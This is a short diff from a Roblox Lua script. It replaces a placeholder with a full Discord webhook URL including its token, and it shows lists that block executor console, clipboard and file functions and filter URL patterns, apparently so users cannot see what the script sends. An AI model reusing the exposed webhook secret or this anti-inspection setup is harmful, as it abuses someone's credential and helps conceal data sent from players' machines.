@@ -4,7 +4,7 @@ local RunService = game:GetService("RunService")
 local HttpService = game:GetService("HttpService")
 local Player = Players.LocalPlayer
 
-local WEBHOOK_URL = "YOUR_WEBHOOK_URL"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1257368823745478887/CtWnhjc0IASjdBiWE8Ychrg5uonDsLE5X166dE2l8gn4W1OBd0pmFjmzyitXToqKRVgv"
 
 local blockedFunctions = {rconsoleprint, print, setclipboard, rconsoleerr, rconsolewarn, warn, error, writefile, appendfile, makefolder, delfolder, isfolder, isfile, readfile, loadfile}
 local urlPatterns = {"https://", "http://", "discord.gg", "discord.com", ".com", ".net", ".org"}
